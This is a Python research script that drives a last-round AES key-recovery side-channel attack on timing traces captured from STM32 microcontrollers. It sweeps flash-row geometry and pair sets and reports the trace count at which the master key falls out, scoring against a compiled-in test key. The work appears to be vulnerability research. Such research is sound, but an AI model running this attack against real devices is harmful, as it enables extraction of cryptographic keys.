"""Last-round key recovery on a capture. THE PART THAT DECIDES.

    python tools/attack.py results/stm32l152re/refsbox-sbox-ram0-*.npz
    python tools/attack.py results/stm32l152re/*.npz --ladder 2500,5000,10000,20000

A STATISTIC IS NOT A CHANNEL. tools/capture.py reports a spread; a spread
can be large and yield nothing, and a pooled z of -21.81 that recovers 0/16
key bytes is not a channel whatever its size. This script runs the recovery
and reports the first trace count at which the exact master key falls out.

TWO GEOMETRY FACTS, and getting either wrong returns a clean null rather
than a degraded answer -- which is why both are taken from the capture
rather than assumed:

  line_shift   log2 of the part's flash read width in bytes. It is a
               PER-PART property and the library's default of 4 (16-byte
               rows) is the Cortex-M4 case, not a constant of the attack.
               Scoring an 8-byte row at 4 merges two real rows into one
               partition and tests a collision that does not exist. It
               comes from mcufw/<part>/board.mk via --line-shift, because
               the device does not report its own flash width.

  line_off     the table's offset within its row, from the table address
               the DEVICE reported and the capture recorded. A trace count
               quoted without it is under-specified: the same firmware at
               three link-time accidents has needed 6 250, 12 500 and
               25 000 traces.

BOTH ADJACENCIES AND ALL SIX PAIR SETS ARE SWEPT, NOT PREDICTED. A byte
S-box build reads in state order; a T-table build that folds ShiftRows into
the last round emits ciphertext-adjacent reads. Guessing wrong does not
degrade gracefully -- it returns a clean null -- and inferring the
exploitable pair from the read order has already cost two parts a wrong
answer elsewhere.
"""
from __future__ import annotations

import argparse
import glob
import json
import pathlib
import sys
import time

import numpy as np

_ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_ROOT / "flashwhisperer"))

from flashattack.lastround import (ROW_PAIRINGS, recover_k10,  # noqa: E402
                                   invert_ks)

#: The victim's compiled-in key. Used only to SCORE; never sent anywhere.
KEY = bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c")


def best_union(ct, y, n, line_shift, line_off):
    """Best recovery over all six pair sets, for each adjacency separately.

    Pair sets are merged by taking, for each round-10 byte, the candidate
    from whichever pair set scored the largest margin on it. Complementary
    pair sets each give eight bytes, so the union can reach all sixteen.
    """
    out = {}
    for ct_adjacent in (False, True):
        union = {}
        for ps in ROW_PAIRINGS:
            k10, margin = recover_k10(ct[:n], y[:n], ROW_PAIRINGS[ps],
                                      line_shift=line_shift,
                                      line_off=line_off,
                                      ct_adjacent=ct_adjacent)
            for i in sorted(k10):
                union.setdefault(i, []).append((margin, k10[i]))
        merged = {i: max(v)[1] for i, v in union.items()}
        exact = False
        master = None
        if len(merged) == 16:
            master = invert_ks({i: merged[i] for i in range(16)})
            exact = (bytes(master) == KEY)
        out["ct" if ct_adjacent else "state"] = (merged, exact, master)
    return out


def run_one(path: pathlib.Path, ladder, line_shift):
    d = np.load(path, allow_pickle=False)
    meta = json.loads(str(d["meta"]))
    ct = d["ct"]
    cyc = d["cyc"].astype(np.float64)

    tab = meta["table_addr"]
    line_off = tab & ((1 << line_shift) - 1)
    in_ram = meta.get("tables_in_ram", False)

    print("\n== %s" % path.name)
    print("   %s %s [%s]  table 0x%08x  line_off %d  n=%d  sd %.4f  distinct %d"
          % (meta["lib"], meta["lib_version"], meta["cfg_str"], tab,
             line_off, len(cyc), cyc.std(ddof=1), len(np.unique(cyc))))

    if len(np.unique(cyc)) == 1:
        print("   one distinct cycle count: there is nothing to recover from,")
        print("   which for a tables-in-RAM build IS the expected result.")
        return dict(variant=meta["variant"], lib=meta["lib"],
                    cfg=meta["cfg_str"], table=tab, line_off=line_off,
                    tables_in_ram=in_ram, sd=0.0, exact_at=None,
                    note="constant")

    exact_at = None
    rows = []
    for n in ladder:
        if n > len(cyc):
            break
        t0 = time.time()
        res = best_union(ct, cyc, n, line_shift, line_off)
        best = 0
        for arm, (merged, exact, master) in res.items():
            # Count correct round-10 bytes against the truth schedule.
            k10_true = _true_k10()
            got = sum(1 for i in merged if merged[i] == k10_true[i])
            best = max(best, got)
            tag = "EXACT MASTER KEY" if exact else "%d/16" % got
            print("     n=%-6d %-5s %s  (%.1fs)"
                  % (n, arm, tag, time.time() - t0))
            if exact and exact_at is None:
                exact_at = n
        rows.append((n, best))
        if exact_at is not None:
            break

    if exact_at is None:
        print("   no exact key up to n=%d" % (rows[-1][0] if rows else 0))
    else:
        print("   EXACT MASTER KEY at %d traces" % exact_at)
    return dict(variant=meta["variant"], lib=meta["lib"],
                cfg=meta["cfg_str"], table=tab, line_off=line_off,
                tables_in_ram=in_ram, sd=float(cyc.std(ddof=1)),
                exact_at=exact_at)


_K10 = None


def _true_k10():
    global _K10
    if _K10 is None:
        from flashattack import aesref
        rk = aesref.key_expansion(KEY)
        # The last round key is the final 16 bytes of the expansion.
        flat = np.asarray(rk, dtype=np.uint8).reshape(-1)
        _K10 = list(flat[-16:])
    return _K10


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("npz", nargs="+")
    ap.add_argument("--ladder", default="2500,5000,10000,20000,50000")
    ap.add_argument("--line-shift", type=int, default=3,
                    help="log2 of the flash read width in BYTES. 3 = 8-byte "
                         "rows (Cortex-M3 STM32L1), 4 = 16-byte, 5 = 32-byte. "
                         "A PER-PART property; see mcufw/<part>/board.mk")
    ap.add_argument("--out", help="write a JSON summary here")
    a = ap.parse_args(argv)

    paths = []
    for pat in a.npz:
        paths.extend(sorted(pathlib.Path(p) for p in glob.glob(pat)))
    if not paths:
        raise SystemExit("no captures matched")

    ladder = [int(x) for x in a.ladder.split(",")]
    results = [run_one(p, ladder, a.line_shift) for p in paths]

    print("\n== summary (line_shift=%d) ==" % a.line_shift)
    print("   %-44s %7s %9s %s" % ("variant", "sd", "table", "exact at"))
    for r in results:
        print("   %-44s %7.4f %9s %s"
              % (r["variant"][:44], r["sd"], "0x%06x" % (r["table"] & 0xFFFFFF),
                 r["exact_at"] if r["exact_at"] else "-"))

    if a.out:
        pathlib.Path(a.out).write_text(json.dumps(results, indent=2))
        print("   wrote %s" % a.out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
